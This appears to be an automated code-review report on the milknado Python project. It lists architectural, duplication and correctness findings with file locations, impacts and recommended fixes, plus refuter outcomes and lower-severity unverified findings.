- Impact: Every src caller passes a real MikadoGraph (app/loop.py:106, app/run.py:393, cli/run.py:240, cancel.py, lifecycle.py), so the non-MikadoGraph branches only serve test fakes. Through those branches, tmux receipts are not observed and task-attempt accounting is skipped (a direct runs.finish), and reconcile_orphaned_runs silently returns []. Tests that use fakes therefore exercise different semantics from production.
- Recommendation: Type these functions on MikadoGraph, or on one port that declares every capability they use, and delete the isinstance/getattr fallbacks. That way a missing capability fails loudly and is not skipped.

#### `src/milknado/domains/dispatch/tmux_run.py:77`

- Slice: dispatch · Dimension: model-purity · Verification: citation-checked
- Claim: The domain module sends process-group signals directly with os.killpg. It does not use the slice's own process port.
- Impact: OS signalling infrastructure lives inside the domain, so the tmux run path cannot be tested without real signals. Its terminate semantics can also drift from the adapter's verified-termination implementation: here SIGKILL is sent without waiting for exit.
- Recommendation: Inject the process termination port into execute_in_window and call terminate_group(pane_pid, _PANE_KILL_GRACE_SECS), so the adapter owns the signal mechanics.

#### `src/milknado/domains/execution/completion.py:98`

- Slice: execution · Dimension: model-purity · Verification: citation-checked
- Claim: Domain code runs shell and git subprocesses and does filesystem I/O directly, and does not go through the GitPort or another port.
- Impact: The completion verifier and merge-back bookkeeping cannot be tested without real git and a real shell. Git behaviour is split between GitPort (adapters/git.py) and ad-hoc subprocess calls in the domain, so the two can diverge, for example in timeouts and error mapping.
- Recommendation: Add GitPort methods for working-tree change and committed change since a base oid. Add a gate-runner port for quality gates, and move the scaffolding, log-copy, and session-file writes behind an adapter.

#### `src/milknado/domains/execution/executor.py:418`

- Slice: execution · Dimension: complexity · Verification: citation-checked
- Claim: executor.py is 1523 lines and the Executor class covers lines 418-1523. run_loop/__init__.py is 600 lines. Both exceed the project's 300-line file and 40-line function limits, and per-file lint suppressions hide this.
- Impact: Dispatch, review gating, cancel watching, worktree management, and completion share one class with many mutable maps (_context_by_node, _unconfirmed_stop_run_ids, _slots). This makes fence and ownership bugs hard to localize and review.
- Recommendation: Split Executor along existing seams: WorktreeManager into its own module, the cancel watcher (_spawn/_watch/_attempt/_finalize_watcher_*), the review gate (_run_review/_gate_review/_apply_review_decision/_redispatch_review_round), and dispatch. Split _dispatch_batch exception handling into helpers. Remove the per-file ignores as each part shrinks.

#### `src/milknado/domains/execution/run_loop/__init__.py:532`

- Slice: execution · Dimension: deslop · Verification: citation-checked
- Claim: The flavor-profile to ExecutionConfig mapping appears twice, in the run loop and in the MCP node runner, and the two copies already differ.
- Impact: A new flavor field must be added in two places, or one path silently ignores it. completion_timeout_seconds is declared `int | None`, but the run-loop path can store a float, which reaches `graph.runs.start(... config.completion_timeout_seconds)`.
- Recommendation: Add one public function in the execution slice, e.g. `ExecutionConfig.for_profile(base, profile)`, use it from both call sites, and apply the same int conversion in one place.

#### `src/milknado/domains/execution/run_loop/_node.py:104`

- Slice: execution · Dimension: correctness · Verification: citation-checked
- Claim: run_node reports 'adversarial review blocked the node' for every completed-status failure that is not a conflict, including failures that are not review failures.
- Impact: mcp/_loop_node_runner.py:251 writes `outcome.detail` into the run's terminal RunResult. Operators then see a review block for a node that had review disabled and that failed on a preserved worker or a merge-back that did not land, which sends recovery to the wrong place.
- Recommendation: Return the real reason from handle_completion (blocked, unrebased, preserved), or check CompletionResult.blocked explicitly. Use the review message only when the review gate blocked the node.

#### `src/milknado/domains/execution/run_loop/input.py:22`

- Slice: execution · Dimension: deslop · Verification: citation-checked
- Claim: The raw-terminal keyboard pipeline (termios/tty/stdin thread, handle_key, InputState.overlay_state) has no production use. Its only output, overlay_state, is never read.
- Impact: About 100 lines of TTY-mutating code (tty.setcbreak on stdin) remain reachable through the default `interactive=True` and can put a caller's terminal in cbreak mode. Vulture does not flag the code because run() still references it. It also puts terminal I/O inside a domain slice.
- Recommendation: Delete input.py, the `interactive` parameter, the drain_input calls, and the InputState threading through CompletionContext. Delete their tests too. If keyboard overlays are needed again, implement them in the app/TUI layer.

#### `src/milknado/domains/github/bind.py:42`

- Slice: github · Dimension: complexity · Verification: citation-checked
- Claim: bind_github_project is 89 lines (42-130), more than twice the project's 40-line function limit. It mixes config resolution, three recovery paths, issue creation, and field setup in one loop, and it repeats the 'adopt the single correlated item' recovery block twice.
- Impact: The crash-recovery state machine is the riskiest logic in the slice. Because two copies of it are spread through one long loop body, a fix applied to one branch can easily miss the other. It also breaks the CLAUDE.md max-function rule.
- Recommendation: Extract a `_bind_goal(...)` helper that returns created/added counts. Run the 'more than one match raises, exactly one match adopts' check once, before the attempt/no-attempt split. Clear the attempt row only when one exists.

#### `src/milknado/domains/graph/_goal_claims.py:185`

- Slice: graph · Dimension: deslop · Verification: citation-checked
- Claim: claim_or_reclaim_goal repeats claim_goal_row's 30-line insert-or-reclaim-dead-owner body line for line.
- Impact: A fix to the dead-owner CAS (for example PID reuse handling) must be applied twice. If the copies drift, the two claim entry points get different fencing semantics.
- Recommendation: Keep one private `_insert_or_reclaim(conn, goal_id, owner, pid, now)` that runs inside the caller's BEGIN IMMEDIATE. Let both functions call it after their own validation (admission, kind check).

#### `src/milknado/domains/graph/_persistence.py:674`

- Slice: graph · Dimension: correctness · Verification: citation-checked
- Claim: drop_all misses github_bind_attempts, fails partway with a FOREIGN KEY error, and leaves its earlier DELETEs in an open transaction that the next unrelated write commits. Production code never calls it (only tests do).
- Impact: A reset after an interrupted GitHub bind leaves the graph corrupted: nodes stay but their edges, file ownership, runs and reviews are gone. The method is test-only, so vulture misses this dead code because the name has a reference in src.
- Recommendation: Delete drop_all and MikadoGraph.drop_all together with their tests, per the project dead-code rule. If a reset is needed, run it inside `with conn:` (BEGIN IMMEDIATE) and include github_bind_attempts.

#### `src/milknado/domains/graph/controller_capability.py:126`

- Slice: graph · Dimension: model-purity · Verification: citation-checked
- Claim: The graph domain does its own OS credential storage: POSIX file I/O with O_NOFOLLOW/fsync/chmod, XDG/HOME environment resolution, and through _windows_controller_storage.py the pywin32 ACL and CreateFile APIs.
- Impact: About 450 lines of platform-specific infrastructure sit inside a domain slice. The domain cannot be tested without touching the real filesystem or credential store, and the Windows path only runs on Windows. This mixes business rules (capability hashing, single-use consumption) with storage mechanics.
- Recommendation: Define a small CredentialStore Protocol (load(hash) -> bytes | None, publish(hash, secret)) in the graph or common slice. Move the POSIX and Windows implementations to adapters/, and inject the store into register_controller_master.

#### `src/milknado/domains/graph/graph.py:1`

- Slice: graph · Dimension: complexity · Verification: citation-checked
- Claim: graph.py (773 lines) and _persistence.py (758 lines) are each more than 2.5x the project's 300-line file ceiling.
- Impact: The MikadoGraph facade combines connection healing, snapshot caching, dispatch orchestration (claim_node_for_dispatch, claim_ancestor_goal_for_dispatch) and raw SQL field updates. _persistence.py combines the 65-step migration ladder, full DDL, row mapping and admin helpers. Both are hard to review, and the mixin split (_AnalyticsFacade/_EdgeFacade with NotImplementedError `_conn` stubs) adds indirection without reducing the size.
- Recommendation: Move the dispatch/goal-claim orchestration methods (graph.py:614-746) into a sub-facade like runs/commands. Split _persistence.py into schema (DDL + MIGRATIONS + migrate) and row/admin helpers.

#### `src/milknado/loop/_agent.py:800`

- Slice: loop · Dimension: complexity · Verification: citation-checked
- Claim: _agent.py has 1344 lines, against a 300-line limit raised to 1390 by an exception. The streaming and blocking runners duplicate the spawn, abort, cleanup, and result-building blocks almost line for line, and _read_agent_stream takes 13 parameters against the project limit of 4.
- Impact: A fix applied to one execution path can easily miss the other, for example the stderr_capture leak in the spawn-failure handlers, which close only stdout_capture in both copies. The size also hides the Windows job-object code that is dead on POSIX.
- Recommendation: Extract a shared context manager for spawn and cleanup (proc, protected, windows_job, captures, log_sink) that both runners use. Move the Windows job-object helpers to their own module, and group the _read_agent_stream inputs in a small dataclass.

#### `src/milknado/loop/_lifeline.py:163`

- Slice: loop · Dimension: correctness · Verification: citation-checked
- Claim: The lifeline poll loop calls store.get with no exception handling. A transient SQLite lock or timeout kills the helper. The parent then counts a helper replacement against a 3-per-worker lifetime cap that never resets, and when that cap is reached it aborts the healthy worker.
- Impact: Under graph-DB contention from many parallel workers, a long-running worker can lose three helpers to 'database is locked' over its lifetime and then be force-stopped. Also, if the parent dies while the helper is crashing, nothing protects the orphaned worker.
- Recommendation: Catch sqlite3.OperationalError and TimeoutError around the poll-loop store.get, log them, and retry on the next tick instead of exiting. Also reset or window the _replacements counter after a replacement reaches READY.

#### `src/milknado/mcp/_loop_node_runner.py:168`

- Slice: mcp · Dimension: import-direction · Verification: citation-checked
- Claim: The detached loop runner is application composition (it wires Executor, RunLoop, LoopAdapter, GitAdapter, CrgAdapter, FlockSlotPool, and ExecutionConfig), but it lives in the MCP delivery package, and milknado.app.loop refers to it by module path. This gives an app -> mcp reverse dependency.
- Impact: The app layer depends at runtime on a private module inside a delivery slice. If someone moves or renames the mcp package, every loop dispatch from CLI or MCP breaks, and no import-linter can detect the edge because it is a string. The file also goes against ADR sliced-bread-crust-003, which says that composition belongs in app/ and that MCP modules only parse and register.
- Recommendation: Move the runner to milknado.app (for example app/loop_runner.py next to app/loop.py and app/_shutdown.py), point _DEFAULT_RUNNER at it, and leave mcp/ with only tool registration.

#### `src/milknado/mcp/_loop_node_runner.py:201`

- Slice: mcp · Dimension: deslop · Verification: citation-checked
- Claim: The runner contains its own copy of the flavor-profile to ExecutionConfig mapping that RunLoop._dispatch_batch already applies, so the two copies can drift.
- Impact: If a new FlavorProfile field is added to one copy only, single-node loop runs (milknado_run_loop_start) and batch runs (milknado run) execute the same flavor with different settings. The copies already differ in small ways: int() versus a raw product for completion_timeout_seconds.
- Recommendation: Add one domain or app function, `exec_config_for_profile(cfg, profile, root)`, and call it from both the runner and RunLoop.

#### `src/milknado/mcp/loop.py:106`

- Slice: mcp · Dimension: correctness · Verification: citation-checked
- Claim: milknado_run_loop_poll never reads the `.terminal-error` sidecar that the loop runner writes when it cannot persist its terminal row, so in that failure the poll keeps reporting `running` with no error.
- Impact: When terminal persistence fails (for example a lost run fence or a SQLite error), the coordinator polls a loop run whose row stays `status=running` and whose `error` is None. The run therefore looks alive until another start_loop_run reconciles orphaned runs. The degraded state that the runner recorded never reaches the caller.
- Recommendation: Make loop poll surface the sidecar in the same way as poll_async_run. A good option is to share one helper in domains/dispatch that loads the run row, tails the log, and applies the terminal-error sidecar, and to call it from both poll tools.

#### `src/milknado/mcp/run.py:182`

- Slice: mcp · Dimension: model-purity · Verification: citation-checked
- Claim: Several MCP tool modules construct adapters and run dispatch policy inline, although ADR sliced-bread-crust-003 and app/node.py say that entry modules construct no adapters and only call app.*.
- Impact: CLI and MCP code paths for cancel, poll reconciliation, and roadmap export can diverge in their wiring. Adapter construction is spread over delivery modules, so tests must monkeypatch them per module (see the duplicate TmuxAdapter patches in tests/test_tmux_dispatch.py).
- Recommendation: Add thin app-level functions (app.run.cancel, app.run.poll_inline, app.github/wiki export wrappers) that own adapter construction and reconciliation, and make the MCP tools call them.

#### `src/milknado/mcp/server.py:9`

- Slice: mcp · Dimension: crust-integrity · Verification: citation-checked
- Claim: MCP tool modules import underscore-private symbols from app modules and silence pyright to do it. In some cases they re-export these symbols as their own API.
- Impact: The app/mcp boundary has no stable public surface: renaming any private helper in app/ breaks the MCP server. The underscore convention no longer tells maintainers what is safe to change. milknado_plan_apply also composes decode, solve, and apply inline (server.py:108-121), not through an app entry point, which goes against ADR sliced-bread-crust-003.
- Recommendation: Give these helpers public names (for example app.plan_batches.apply_plan_manifest(root, manifest, parent_id, budget, force_single_batch) that wraps decode, solve, open, and apply). Make the MCP modules call only public app functions, and delete the pyright suppressions and the test-only re-exports.

#### `src/milknado/domains/planning/planner.py:109`

- Slice: planning · Dimension: correctness · Verification: citation-checked
- Claim: launch writes a manifest to the graph even when the planning agent exited non-zero, but propose rejects the same case.
- Impact: A crashed or interrupted planner that printed a fenced block still creates permanent Mikado nodes, and the CLI reports exit 0. The two planning entry points also disagree on what counts as a valid plan.
- Recommendation: Check process.exit_code before parse and apply in launch, as propose does, and return a failed PlanResult without graph writes.

#### `src/milknado/domains/wiki/_locate.py:65`

- Slice: wiki · Dimension: correctness · Verification: citation-checked
- Claim: _roadmap_indexes reads every top-level wiki directory's index.md, and it catches only FileNotFoundError. Because the scan runs before any slug match, one unrelated symlinked or non-regular index.md stops the lookup for every roadmap, nested ones included.
- Impact: `milknado roadmap export` and milknado_roadmap_export (and the github slice's goal_file_map/bind, which call locate_roadmap_dir) fail for every roadmap because of one wiki page that is not a roadmap. Hallouminate puts an index.md in every wiki directory (architecture/, conventions/, gotchas/), so the legacy-flat scan reads many such files.
- Recommendation: In the legacy-flat scan, skip candidates that raise RoadmapPathError (or that are not regular files), or read only the candidate whose slug can match. Better: scan roadmaps/ first and fall back to the flat layout only when nothing matched.

#### `src/milknado/domains/wiki/exporter.py:79`

- Slice: wiki · Dimension: correctness · Verification: citation-checked
- Claim: export_roadmap treats any goal node whose wiki_ref has no matching file as an orphan. It then creates a new goal file from the node description and overwrites the node's wiki_ref. A goal whose file the author renamed, deleted, or re-dated therefore comes back as a duplicate file.
- Impact: Scenario: an author renames foo.md to bar.md, then runs import and export. Import creates a new node for bar (its key is new), while the old node keeps the stale ref. Export then writes a resurrected `<slugified-description>.md` next to bar.md, so the wiki gains a duplicate goal, and the two nodes diverge in the graph.
- Recommendation: Create a file only for goal nodes that never had a wiki_ref (milknado-native goals). For a node whose non-null wiki_ref no longer resolves, report it as stale (or fail loud) instead of writing a new file.

#### `src/milknado/domains/wiki/importer.py:181`

- Slice: wiki · Dimension: correctness · Verification: citation-checked
- Claim: Re-import only adds prereq edges and never removes edges that the wiki no longer lists. A prereq that the author removes stays in the graph and keeps blocking the goal.
- Impact: The wiki is the authored source of the goal DAG, and import claims to be idempotent. But after an author removes `prereqs: [x]` from a goal file, re-import keeps the edge goal -> x, so the loop still blocks the goal on x. Only deprecated goals have edges removed (_apply_document_state).
- Recommendation: For goal-to-goal edges under the roadmap, compute the set difference and remove edges to sibling goals that the document no longer lists. Leave task edges as they are. Add a re-import test that removes a prereq.

## Refuter outcomes

| Location | Outcome | Reason |
| --- | --- | --- |
| `src/milknado/mcp/loop.py:65` | confirmed | Confirmed in code: mcp/loop.py:65 passes runner_cmd unvalidated, app/loop.py:56-58 shlex-splits it, and app/loop.py:196 spawns it, while the |
| `src/milknado/domains/graph/_mutations.py:41` | confirmed | Reproduced: adding a GOAL node, calling g.github.bind(...), then g.delete_node(n.id) raises IntegrityError FOREIGN KEY constraint failed, be |
| `src/milknado/domains/graph/_connection.py:38` | confirmed | Reproduced: while another connection held BEGIN EXCLUSIVE on a healthy DB, open_connection waited about 5s, logged 'quick_check (error)', re |
| `src/milknado/domains/coordinator/control.py:149` | confirmed | Confirmed by reading: decide_plan -> _preflight_plan -> get_proposal raises KeyError (plans.py:51-52), _execute_reserved catches only ValueE |
| `src/milknado/domains/coordinator/workflow.py:121` | confirmed | create_group links a 'provider_session' entity from the client-supplied CreateGroup.provider_session_id and never creates a binding (bind_pr |
| `src/milknado/domains/coordinator/projection.py:29` | confirmed | milknado.loop is the vendored ralphify process engine, and its __init__ eagerly imports RunManager and run_session, so coordinator/projectio |
| `src/milknado/domains/dispatch/isolate.py:222` | confirmed | At isolate.py:222-225, a GitOperationError from remove_worktree after compare_and_swap_ref has landed the commit returns rebased=False, and  |
| `src/milknado/domains/execution/run_loop/__init__.py:56` | confirmed | Six execution-domain modules import milknado.loop, which imports domains.common back, and importing run_loop.state does load psutil and milk |
| `src/milknado/domains/execution/run_loop/_verification.py:55` | confirmed | Confirmed: line 55 passes str(self._graph), and at runtime no class in MikadoGraph's MRO except object defines __str__ or __repr__, so build |
| `src/milknado/domains/batching/graph_build.py:70` | confirmed | Confirmed: manifest.py:46 rejects absolute paths, and CrgAdapter.get_impact_radius passes them through unchanged; CRG's normalize_file_path  |
| `src/milknado/domains/batching/graph_build.py:164` | confirmed | Confirmed by running build_change_graph against the real CRG store with absolute paths: an IMPORTS_FROM edge app->lib plus impacted_files li |
| `src/milknado/domains/batching/solver.py:91` | confirmed | Reproduced: with the default 10s limit and 120K budget, 60 chained changes gave FEASIBLE, but 80 and 150 changes gave UNKNOWN with 0 batches |

## Above the floor, past the refuter cap

These findings passed the citation check. The refuter cap of 12 stopped before them, so no refuter tested them.

- [high] src/milknado/domains/planning/batching_bridge.py:57 — apply_batches_to_graph commits its writes one at a time and validates the parent only partly, so a rejected apply leaves an orphan TASK node and a batch_plans row behind. (past the 12-finding refuter cap)
- [high] src/milknado/domains/planning/planner.py:213 — Planner.launch attaches every new plan to the oldest unarchived root of any kind or status, so planning fails after the agent run when that root is a ROADMAP, and a new goal is silently merged into an unrelated existing goal. (past the 12-finding refuter cap)
- [high] src/milknado/domains/github/models.py:22 — The domain-owned GithubItem contract expects `body` and `url` at the top level of each item, but `gh project item-list --format json` nests them under `content`. The real adapter decodes every item with an empty body and a None url. (past the 12-finding refuter cap)
- [high] src/milknado/domains/common/agent_argv.py:234 — The planning sandbox for claude, gemini, and codex removes a fixed denylist of exact tokens, so short flags, equals-form flags, aliases, and capability-widening flags still reach the read-only planning subprocess. (past the 12-finding refuter cap)
- [high] src/milknado/domains/common/redaction.py:10 — The secret regex needs a word boundary right before the key name, so env-var style and prefixed keys (GITHUB_TOKEN=, OPENAI_API_KEY=, access_token=) are never redacted. The literal-token branch also covers only sk- and ghp_ prefixes. (past the 12-finding refuter cap)
- [high] src/milknado/domains/common/__init__.py:1 — Consumers bypass the common barrel widely: 52 import statements in 38 src files import common submodules directly, and some symbols they need are missing from the barrel. (past the 12-finding refuter cap)
- [high] src/milknado/adapters/git.py:45 — A mergiraf timeout or OSError escapes GitAdapter.rebase() before `git rebase --abort` runs, so the worker worktree stays mid-rebase and the merge-back callers do not catch the exception. (past the 12-finding refuter cap)
- [high] src/milknado/adapters/process.py:195 — terminate_group sends SIGTERM and then SIGKILL to the process group of a bare stored PID and never checks the process start token, so a reused PID kills an unrelated process group. (past the 12-finding refuter cap)
- [high] src/milknado/adapters/coordinator_turns.py:36 — Adapter modules import at least nine private modules of the milknado.loop package directly, which bypasses its published `__all__` crust. (past the 12-finding refuter cap)
- [high] src/milknado/app/plan.py:253 — The adversarial plan critic gets a one-line count summary in place of the plan manifest, so it cannot judge the plan content against the goal. (past the 12-finding refuter cap)
- [high] src/milknado/app/plan.py:257 — Each critic 'revise' round calls `planner.launch`, which writes a new set of nodes into the graph. Nodes from rejected plans stay in the graph, and the critic never reviews the last revision. (past the 12-finding refuter cap)
- [high] src/milknado/adapters/coordinator_turns.py:36 — Eleven adapter modules make 28 imports from private loop modules. The loop barrels export only 9 names, so the real public surface of the slice is undeclared and nothing enforces it. (past the 12-finding refuter cap)
- [high] src/milknado/cli/tools.py:92 — _merge_json treats an unparseable existing settings file as empty, then overwrites it, so `milknado init` silently deletes the user's Claude/Gemini settings, including deny rules and env. (past the 12-finding refuter cap)
- [high] src/milknado/cli/tools.py:154 — The Cursor hook writer puts a list-shaped hooks file at <project>/hooks/hooks.json. Cursor loads project hooks only from .cursor/hooks.json, and that file uses an event-keyed object, so the rtk hook is never wired. (past the 12-finding refuter cap)
- [high] src/milknado/web/routes/node_notes.py:66 — The skip action commits three separate graph writes (note, PENDING, DONE), so a DONE rejection leaves a 'skipped' node requeued as PENDING while the response reports failure. (past the 12-finding refuter cap)
- [high] src/milknado/plugins/scaffold.py:62 — scaffold_plugin does not validate `name` as a Python identifier, so a kebab-case name (or any non-identifier name) generates a package that cannot be imported, and its README tells the user to configure exactly that broken name. (past the 12-finding refuter cap)
- [high] src/milknado/plugins/loader.py:13 — _find_plugin_class duck-types any class that has `meta` and `on_node_status_change` attributes, and it returns the first one in alphabetical dir() order, so it can pick the imported `PluginHook` Protocol instead of the user's plugin class. (past the 12-finding refuter cap)
- [high] src/milknado/project.py:21 — load_project_config skips the documented defaults -> global -> local cascade when the project has no milknado.toml, so the user-global config is silently ignored except host_worker_limit. (past the 12-finding refuter cap)
- [high] src/milknado/domains/execution/run_loop/state.py:7 — The execution domain imports the concrete loop engine package (milknado.loop) from six modules to get RunStatus and CompletionVerdict, so the domain arrow points outward to the infra layer. (past the 12-finding refuter cap)
- [high] src/milknado/domains/coordinator/projection.py:29 — The coordinator domain reads provider capabilities directly from the loop session engine, so the coordinator slice depends on infra internals. (past the 12-finding refuter cap)

## Below the severity floor

These low-severity findings are below the `medium` floor. The workflow did not verify them.

- [low] src/milknado/domains/graph/_transitions.py:61 — _apply_transition commits the terminal status write before it releases the goal claim, so the two writes are not atomic when the caller has no open transaction.
- [low] src/milknado/domains/graph/graph.py:194 — A graph from open_snapshot (the in-memory dry-run copy) self-heals by opening the real database read-write, so later dry-run mutations go to the live graph.
- [low] src/milknado/domains/graph/_status_reclaim.py:29 — try_reclaim and try_reclaim_goal accept a `now` parameter and discard it. Private `_values` helpers repeat the shared _sqlite_rows.as_tuple.
- [low] src/milknado/domains/coordinator/recovery.py:91 — _write_turn_event writes raw SQL into coordinator_events and bypasses journal._write_event. It stores the provider family in entity_kind, the provider session id in entity_id, and the turn id in tool_name, even though the table has turn_id and provider_session_id columns.
- [low] src/milknado/domains/coordinator/__init__.py:36 — Several barrel exports and module re-exports have no consumer outside the slice in src/. Only tests use them, so the public crust is wider than needed.
- [low] src/milknado/domains/coordinator/recovery_receipts.py:11 — Ownership and enum checks are duplicated across modules: the coordinator_links ownership query is written three times, and the recovery outcome set copies the RecoveryOutcome Literal by hand.
- [low] src/milknado/domains/dispatch/async_run.py:181 — _bind_attempt duplicates _sync_completion.start_sync_attempt line for line, and AsyncRunRequest already satisfies the SyncFailureRequest protocol that start_sync_attempt accepts.
- [low] src/milknado/domains/dispatch/runner.py:138 — _execute and execute_cancellable build the same worker env and process.run call. They differ only in the cancel_requested hook and the outcome tuple, and _log_path copies the make_run_id format.
- [low] src/milknado/domains/dispatch/__init__.py:69 — The crust exports runner.RunResult under the same name as domains.common.RunResult, which is a different type. The barrel also exports RunResult, AsyncStartRef, run_headless and MergeBackResult, which no code outside the slice imports.
- [low] src/milknado/domains/dispatch/app_loop_duplicate.py:106 — app/loop.py reimplements the stale-node reclaim sequence that the dispatch crust already exports as reclaim_stale_node.
- [low] src/milknado/domains/dispatch/isolate.py:218 — The merge-back rebases onto ctx.base_oid, the commit the worker branch was created from. After squash_and_commit on that same base, this rebase is a no-op, so the 'rebase' step adds nothing.
- [low] src/milknado/domains/dispatch/lifecycle.py:222 — In the except branch, the `not started` guard is always true because the started case already re-raised. _finish_dispatch also takes `result: object` and casts it back, although run_headless returns a concrete type.
- [low] src/milknado/domains/dispatch/cancel.py:33 — The comment that sizes the cancel timeout refers to SIGTERM→SIGKILL grace in runner.py, but runner.py no longer has any termination logic.
- [low] src/milknado/domains/dispatch/isolate.py:22 — The domain module imports the third-party filelock library and creates lock files on disk to serialize merge-backs.
- [low] src/milknado/domains/dispatch/isolate.py:161 — create_isolated_worktree is a pure pass-through to _create_node_worktree with an identical signature.
- [low] src/milknado/domains/execution/executor.py:220 — The transient-error check treats any exception whose message contains the substring '429' as a rate limit, so it retries deterministic dispatch failures.
- [low] src/milknado/domains/execution/executor.py:390 — The executor probes with getattr for port methods that GitPort and LoopPort already declare, so a port implementation without the method skips the merge-collision safety check without any error.
- [low] src/milknado/domains/execution/executor.py:437 — Executor requires a CrgPort and stores it, but no code reads it.
- [low] pyproject.toml:109 — The barrel-enforcement import-linter contract lists an execution module that does not exist and leaves out most real execution internals.
- [low] src/milknado/domains/batching/_model.py:59 — Symbol-spread variables use only normal SCCs, so a symbol shared with an oversized SCC is never reported in spread_report.
- [low] src/milknado/domains/batching/solver.py:37 — solver.py has a misleading default, a discarded return value, and redundant lazy imports.
- [low] src/milknado/domains/batching/graph_build.py:226 — There is stale AI-residue commentary, a dead compatibility key, and duplicated estimation logic.
- [low] src/milknado/domains/planning/planner.py:94 — A run with no manifest reports success=True when the agent exits 0.
- [low] src/milknado/domains/planning/planner.py:76 — The `target_goal_id` keyword on launch is never passed by a production caller.
- [low] src/milknado/domains/planning/planner.py:261 — _safe_ensure_crg returns its unchanged input next to a bool, so every caller repeats `crg if crg_ok else None`.
- [low] src/milknado/domains/planning/context.py:222 — The prompt text tells the planning agent that edges are '3-line rows' with a relationship_type, which does not match the edges table.
- [low] src/milknado/domains/github/_intent.py:14 — _intent.py imports parse_goal_document from the wiki slice's internal `model` module, not from the wiki barrel, which already exports it.
- [low] src/milknado/domains/github/bind.py:78 — bind.py casts the result of the typed `graph.github.attempt()` to an untyped dict, which discards the GithubBindAttempt TypedDict and forces a runtime isinstance check on a field that is already typed.
- [low] src/milknado/domains/github/bind.py:48 — The `owner`/`number` override parameters on bind_github_project are used only by a test, and `_resolve_project` silently ignores a partial override.
- [low] src/milknado/domains/github/_fields.py:13 — _OPTION_BY_STATUS copies the NodeStatus enum by hand, so the `option is None` guard in the exporter cannot be reached.
- [low] src/milknado/domains/wiki/exporter.py:114 — The orphan goal filename comes from the full, untruncated slugify(goal.description). A description longer than about 214 slug characters makes the temporary file name exceed the 255-byte NAME_MAX, so the export aborts partway through.
- [low] src/milknado/domains/wiki/_serialize.py:77 — When the harvest markers are absent, replace_harvest_block appends a second `## Outcome` heading, even if the file already has an authored Outcome section. parse_body discards duplicate sections, so the canonical model never sees the harvested outcome.
- [low] src/milknado/domains/wiki/importer.py:109 — _stamp_missing_created uses a raw substring check to detect an existing `created` key, and it writes to wiki files before the roadmap passes validation.
- [low] src/milknado/domains/wiki/render.py:37 — _label escapes double quotes with a backslash, but Mermaid flowchart labels do not support backslash escapes; Mermaid expects `#quot;`. A goal title containing `"` therefore produces invalid Mermaid source.
- [low] src/milknado/domains/github/_intent.py:14 — The github slice imports parse_goal_document from the wiki internal module instead of the wiki barrel, although the barrel exports the same symbol.
- [low] src/milknado/domains/wiki/importer.py:116 — load_model keeps a parameter it immediately deletes, which acts as a compatibility shim in a pre-release project. The slug-safety check also exists twice with identical logic.
- [low] src/milknado/domains/wiki/_locate.py:178 — A try/except re-raises the same exception unchanged. In importer._apply_document_state, a node is re-fetched only to repeat a None check whose result is never used.
- [low] src/milknado/domains/wiki/_markdown.py:49 — parse_body is 52 lines with a suppressed too-many-statements rule (the project limit is 40 lines). _ingest_file takes 8 parameters (the limit is 4), including a document argument that serves only to return its edges.
- [low] src/milknado/domains/common/errors.py:52 — Several errors in the shared kernel have exactly one consuming slice, and TransientDispatchError is never raised by production code.
- [low] src/milknado/domains/common/flavor_profile.py:59 — resolve_flavor_profile has defensive and dead code, and repeats the cursor-resume check with the same message that FlavorTable._reject_cursor_resume already enforces at decode time.
- [low] src/milknado/domains/common/flavor_codec.py:132 — FlavorTable checks execution_agent by basename, so it accepts path-bearing executables that validate_worker_argv later rejects at dispatch.
- [low] src/milknado/domains/common/__init__.py:138 — __all__ lists TerminalRunOutcome twice.
- [low] src/milknado/adapters/_loop_session.py:76 — _attach_session_sink re-wires the same three run.config session callbacks that _configure_session_commands already set, so for a given run_id create_run assigns them twice.
- [low] src/milknado/adapters/crg.py:95 — _walk_sources follows directory symlinks and calls stat on every matching path, so a dangling `*.py` symlink or a symlink loop raises OSError and ensure_graph fails.
- [low] src/milknado/adapters/host_slots.py:115 — The doctor `holders()` probe takes LOCK_SH on each slot, so a concurrent acquire() that finds every other slot taken raises HostCapacityFull even though a slot is free.
- [low] src/milknado/adapters/loop.py:209 — get_run_failure_detail probes RunState attributes that are declared with getattr and isinstance, while sibling methods access the same attributes directly.
- [low] src/milknado/adapters/coordinator_turns.py:142 — A production precondition on the turn owner id uses `assert`, which `python -O` removes.
- [low] src/milknado/app/run.py:199 — `attached_watch_source` uses `import_module` and returns `object` to avoid a run↔watch import cycle that exists only because watch.py imports re-exported snapshot types through app.run.
- [low] src/milknado/app/plan.py:31 — app modules list underscore-private names in `__all__`, and the CLI and MCP entry points consume those names as a public API.
- [low] src/milknado/app/loop.py:86 — `_claim_loop` repeats the task-node lookup and kind check that `inline_gates.require_task_node` already provides.
- [low] src/milknado/app/session_navigation.py:78 — `RunNavigationMixin._run_index` repeats `run_view.run_index`, and the `RunSnapshot` alias is defined in three modules.
- [low] src/milknado/app/run_commands.py:78 — `_run_control` tells a finished controller apart from a real failure by comparing the exception message text.
- [low] src/milknado/loop/engine.py:339 — The engine reads a declared AgentResult field through getattr with a default, and it double-casts state.status to defeat type narrowing.
- [low] src/milknado/loop/sessions/_lifecycle.py:36 — The `# noqa: V1xx` placeholder suppresses no vulture finding. Vulture parses the code as 'V1', which matches none of V101-V107.
- [low] src/milknado/loop/_run_types.py:157 — The RunState counter-invariant docstring contradicts the total property, which also counts interrupted iterations.
- [low] src/milknado/loop/sessions/_runtime.py:17 — Session modules import private helpers from _agent with pyright suppressions. Several loop files also bypass the domains.common barrel even though it exports the same names.
- [low] src/milknado/loop/_lifeline.py:22 — Two different Protocols share the name WorkerEvidence. In _process_contract it is an evidence-store port. In _lifeline it is a worker-record view that duplicates WorkerRecordView.
- [low] src/milknado/cli/plan.py:162 — The plan session functions exceed the 4-parameter limit (execute_plan has 7, _exec_plan_interactive has 6, _exec_plan_non_interactive has 5) behind a per-file PLR0913 ignore. The solver-UNKNOWN warning block is copied in both paths.
- [low] src/milknado/cli/plan.py:39 — cli/plan.py re-exports private names from milknado.app.plan (and cli/__init__.py re-exports `_derive_goal`) only so tests can import them from the CLI module.
- [low] src/milknado/cli/run.py:195 — The CLI imports a private app module and adapter submodules, although the adapter barrel already exports those classes.
- [low] src/milknado/cli/__init__.py:114 — cli/__init__.py is 328 lines, over the 300-line project limit, and the CRG CalledProcessError handling is copied in init and index.
- [low] src/milknado/cli/web.py:73 — The code reads flavor_registry from a typed MilknadoConfig with defensive getattr, and maybe_block_parent compares the status enum by string value.
- [low] src/milknado/cli/web.py:178 — `milknado launch` duplicates `milknado web`, but has no --allow-host option.
